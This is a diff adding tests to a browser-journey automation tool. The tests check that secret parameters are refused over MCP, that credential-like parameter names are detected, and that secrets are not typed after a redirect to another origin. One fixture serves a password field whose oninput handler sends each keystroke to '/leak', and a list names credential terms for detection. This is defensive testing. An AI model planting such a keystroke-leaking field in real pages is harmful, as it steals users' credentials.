@@ -13,6 +13,7 @@ import { buildProgram } from "./program.js";
 import { journeyReviewHash } from "./journey-review.js";
 import type { CliDeps } from "./cli-shared.js";
 import { SECRET_PARAM_OVER_MCP } from "./secret-params.js";
+import { prefixFromBranch, type RecordedBranch } from "./journey-prefix.js";
 import { useSkippingTime } from "../../explore/src/testkit.js";
 
 /**
@@ -24,6 +25,8 @@ import { useSkippingTime } from "../../explore/src/testkit.js";
 
 const VALUE = "S3ntinelVaLue9Zq";
 const VAR = "JEV_TEST_SECRET_PARAM";
+const MINTED = "minted-tok-9Zq";
+let redirectTo: string | undefined;
 
 let server: Server;
 let origin: string;
@@ -88,8 +91,8 @@ function allFiles(dir: string): string[] {
 }
 
 /** Every file under the test's root that holds the value: the run records, results and logs included. */
-function filesHoldingValue(): string[] {
-  return allFiles(root).filter((f) => readFileSync(f).includes(VALUE));
+function filesHoldingValue(value = VALUE): string[] {
+  return allFiles(root).filter((f) => readFileSync(f).includes(value));
 }
 
 const cliDeps = (): CliDeps =>
@@ -144,7 +147,16 @@ async function cli(args: string[]): Promise<{ out: string; err: string; exitCode
 }
 
 beforeAll(async () => {
-  server = createServer((_req, res) => {
+  server = createServer((req, res) => {
+    if (req.url === "/mint") {
+      res.writeHead(200, { "content-type": "application/json" });
+      res.end(JSON.stringify({ tok: MINTED, order: "ord-1" }));
+      return;
+    }
+    if (req.url === "/go" && redirectTo !== undefined) {
+      res.writeHead(302, { location: redirectTo }).end();
+      return;
+    }
     pageLoads += 1;
     res.writeHead(200, { "content-type": "text/html" });
     res.end(
@@ -323,5 +335,170 @@ describe("CLI: a secret parameter off the command line", { timeout: 120_000 }, (
     expect(r.out + r.err).not.toContain(VALUE);
     expect(r.exitCode).toBe(64);
     expect(pageLoads).toBe(0);
+  });
+});
+
+describe("which names count (H3, M3)", { timeout: 120_000 }, () => {
+  useSkippingTime();
+  const fillNamed = (name: string, secret?: boolean): Journey => {
+    const j = journey(`named-${name}`, name);
+    j.metadata.parameters = [{ name, ...(secret === undefined ? {} : { secret }) }];
+    j.recording.pages[0]!.steps = [
+      { step: { kind: "navigate", url: "/", expect: { kind: "visible", target: { testId: "who" } } } },
+      { step: { kind: "fill", target: { testId: "who" }, value: { var: name }, expect: { kind: "visible", target: { testId: "who" } } } },
+    ] as never;
+    j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" } as never;
+    writeFileSync(join(journeysDir, `${j.metadata.id}.json`), JSON.stringify(j));
+    return j;
+  };
+
+  it.each(["pwd", "jwt", "bearer", "authorization", "auth", "pin_code", "pinCode", "privateKey", "access_key", "mfa_code", "ssn", "cvv", "sess"])("%s is refused when undeclared", async (name) => {
+    fillNamed(name);
+    const r = await call("run_journey", { id: `named-${name}`, params: { [name]: VALUE } });
+    expect(r.body).toMatchObject({ code: SECRET_PARAM_OVER_MCP, params: [name] });
+    expect(r.text).not.toContain(VALUE);
+  });
+
+  it.each(["passengers", "footprint", "compass", "bypass_cache", "passport_country", "spin", "hotpink", "author", "authorName"])("%s runs without declaring anything", async (name) => {
+    fillNamed(name);
+    const r = await call("run_journey", { id: `named-${name}`, params: { [name]: "3" } });
+    expect(r.body["outcome"], r.text).toBe("ok");
+  });
+
+  it.each(["token_count", "tokenCount", "session_name", "cookie_banner", "otp_channel"])("%s has a credential segment: refused until it declares secret: false", async (name) => {
+    fillNamed(name);
+    expect((await call("run_journey", { id: `named-${name}`, params: { [name]: "3" } })).body).toMatchObject({ code: SECRET_PARAM_OVER_MCP });
+    fillNamed(name, false);
+    const r = await call("run_journey", { id: `named-${name}`, params: { [name]: "3" } });
+    expect(r.body["outcome"], r.text).toBe("ok");
+    expect(r.body["output"]).toMatchObject({ [name]: "3" }); // and it is not redacted
+  });
+});
+
+describe("a bound secret is typed only on its own origin (M1)", { timeout: 120_000 }, () => {
+  useSkippingTime();
+  let other: Server;
+  let otherOrigin: string;
+  let otherHits: string[] = [];
+
+  beforeAll(async () => {
+    other = createServer((req, res) => {
+      otherHits.push(req.url ?? "");
+      res.writeHead(200, { "content-type": "text/html" });
+      // Whatever lands in the field goes straight to this server, with no click.
+      res.end(`<label>Password <input id=pw data-testid=pw type=password oninput="fetch('/leak?v='+encodeURIComponent(this.value))"></label><button>Sign in</button><p data-testid=status></p>`);
+    });
+    await new Promise<void>((r) => other.listen(0, "127.0.0.1", r));
+    otherOrigin = `http://127.0.0.1:${(other.address() as { port: number }).port}`;
+    redirectTo = `${otherOrigin}/login`;
+    const j = journey("redirected");
+    (j.recording.pages[0]!.steps[0] as { step: { url: string } }).step.url = "/go";
+    j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" } as never;
+    writeFileSync(join(journeysDir, "redirected.json"), JSON.stringify(j));
+  });
+  afterAll(() => {
+    redirectTo = undefined;
+    other.closeAllConnections();
+    other.close();
+  });
+  beforeEach(() => {
+    otherHits = [];
+  });
+  const noLeak = (): void => {
+    expect(otherHits.length).toBeGreaterThan(0); // the redirect did land there...
+    expect(otherHits.filter((u) => u.startsWith("/leak"))).toEqual([]); // ...and nothing was typed
+  };
+
+  it("targets.json over MCP: the step fails, and the other origin receives nothing", async () => {
+    const r = await call("run_journey", { id: "redirected", env: "local" });
+    expect(r.body["outcome"], r.text).not.toBe("ok");
+    expect(r.text).toContain("E_SECRET_ORIGIN_REFUSED");
+    expect(r.text).toContain(otherOrigin);
+    expect(r.text).not.toContain(VALUE);
+    noLeak();
+  });
+
+  it("--secret-field on the CLI: the same", async () => {
+    const r = await cli(["journey", "run", "redirected", "--secret-field", `label=Password=env:${VAR}`, "--json"]);
+    expect(r.out).toContain("E_SECRET_ORIGIN_REFUSED");
+    expect(r.out + r.err).not.toContain(VALUE);
+    noLeak();
+  });
+
+  it("the page's own origin still gets it", async () => {
+    const r = await call("run_journey", { id: "login", env: "local" });
+    expect(r.body["outcome"], r.text).toBe("ok");
+  });
+});
+
+describe("one label, two secret parameters (M2)", { timeout: 120_000 }, () => {
+  useSkippingTime();
+  const OTHER_VAR = "JEV_TEST_SECRET_PARAM_2";
+  beforeAll(() => {
+    const j = journey("two-on-one");
+    j.metadata.params = ["secret1", "secret2"];
+    j.metadata.parameters = [{ name: "secret1", secret: true }, { name: "secret2", secret: true }];
+    const steps = j.recording.pages[0]!.steps as unknown as Array<{ step: Record<string, unknown> }>;
+    steps.splice(2, 0, { step: { kind: "fill", target: { label: "Password" }, value: { var: "secret2" }, expect: { kind: "visible", target: { testId: "pw" } } } });
+    j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" } as never;
+    writeFileSync(join(journeysDir, "two-on-one.json"), JSON.stringify(j));
+  });
+
+  it("targets.json with one binding over MCP: refused by name, nothing typed", async () => {
+    const r = await call("run_journey", { id: "two-on-one", env: "local" });
+    expect(r.body).toMatchObject({ code: "E_SECRET_FIELD_AMBIGUOUS", params: ["secret1", "secret2"] });
+    expect(pageLoads).toBe(0);
+    expect(r.text).not.toContain(VALUE);
+  });
+
+  it.each([
+    ["one flag", [`label=Password=env:${VAR}`]],
+    ["two flags", [`label=Password=env:${VAR}`, `label=Password=env:${OTHER_VAR}`]],
+  ])("%s on the CLI: exit 64, says ambiguous, not 'matches no parameter'", async (_n, specs) => {
+    vi.stubEnv(OTHER_VAR, "AnotherValue14x");
+    const r = await cli(["journey", "run", "two-on-one", ...specs.flatMap((s) => ["--secret-field", s]), "--json"]);
+    expect(r.exitCode).toBe(64);
+    expect(r.out).toContain("cannot say which value");
+    expect(r.out).not.toContain("matches no secret parameter");
+    expect(r.out + r.err).not.toContain(VALUE);
+    expect(pageLoads).toBe(0);
+  });
+
+  it("--param for one of them settles it: the binding supplies the other", async () => {
+    vi.stubEnv(OTHER_VAR, "AnotherValue14x");
+    const r = await cli(["journey", "run", "two-on-one", "--param", "secret1=AnotherValue14x", "--secret-field", `label=Password=env:${VAR}`, "--json"]);
+    expect(JSON.parse(r.out)).toMatchObject({ ok: true, data: { outcome: "ok" } }); // typed last: VALUE's length
+  });
+});
+
+describe("a fixture output named like a credential (M4)", { timeout: 120_000 }, () => {
+  useSkippingTime();
+  const writeFixtures = (): string => {
+    const file = join(root, "fixtures.json");
+    writeFileSync(file, JSON.stringify({ setup: [{ name: "mint", method: "POST", url: "/mint", outputs: { authToken: "$.tok", orderId: "$.order" } }] }));
+    return file;
+  };
+
+  it("is left out of fixtures.outputs, and a public one stays", async () => {
+    const r = await call("run_journey", { id: "plain", fixtures: writeFixtures(), params: { who: "Ada" } });
+    expect(r.text, r.text).not.toContain(MINTED);
+    expect((r.body["fixtures"] as { outputs: unknown }).outputs).toEqual({ orderId: "ord-1" });
+  });
+
+  it("is redacted when a param carried it", async () => {
+    const r = await call("run_journey", { id: "plain", fixtures: writeFixtures(), params: { who: "${setup.authToken}" } });
+    expect(r.body["outcome"], r.text).toBe("ok");
+    expect(r.text).not.toContain(MINTED);
+    expect(filesHoldingValue(MINTED)).toEqual([]);
+  });
+});
+
+describe("verify-fix and regression --param (L2)", () => {
+  it("prefixFromBranch warns by name, without the value", async () => {
+    const lines: string[] = [];
+    const branch = { journeyId: "login", step: 1, replay: { journeysDir, params: {}, secretParams: ["secret1"] } } as unknown as RecordedBranch;
+    await prefixFromBranch(branch, { params: { secret1: VALUE }, warn: (l) => lines.push(l) }).catch(() => undefined);
+    expect(lines.join("")).toContain("secret1");
+    expect(lines.join("")).not.toContain(VALUE);
   });
 });
